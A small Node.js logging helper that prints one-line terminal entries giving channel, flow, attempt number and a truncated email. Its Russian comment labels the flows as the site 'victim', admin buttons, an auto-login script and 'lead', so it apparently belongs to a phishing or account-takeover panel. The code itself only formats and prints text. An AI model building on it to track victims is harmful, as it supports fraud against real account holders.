'use strict';

/**
 * Единый вид строки в терминале PM2/Node: [КАНАЛ] поток | попытка | email: действие
 * поток: Сайт (жертва), Админ (кнопки), Автовход (скрипт), Система (без лида)
 */
function logTerminalFlow(channel, flow, attempt, email, message) {
  const ch = (channel || 'LOG').trim() || 'LOG';
  const fl = (flow || '—').trim() || '—';
  const at =
    attempt != null && String(attempt).trim() !== '' ? String(attempt).trim() : '—';
  let em = email != null ? String(email).trim() : '';
  if (em.length > 72) em = em.slice(0, 69) + '...';
  if (!em) em = '—';
  const msg = String(message || '')
    .replace(/\s+/g, ' ')
    .trim();
  console.log(`[${ch}] ${fl} | ${at} | ${em}: ${msg}`);
}

module.exports = { logTerminalFlow };
